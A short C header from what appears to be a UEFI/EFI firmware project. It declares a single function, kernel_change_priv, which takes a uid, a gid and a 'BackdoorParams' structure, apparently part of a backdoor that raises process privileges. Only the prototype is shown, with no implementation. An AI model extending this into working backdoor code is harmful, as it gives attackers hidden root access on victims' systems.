#ifndef __KERNEL_H__
#define __KERNEL_H__

#include "ioctl.h"

EFI_STATUS kernel_change_priv(UINT32 uid, UINT32 gid, struct BackdoorParams*);

#endif
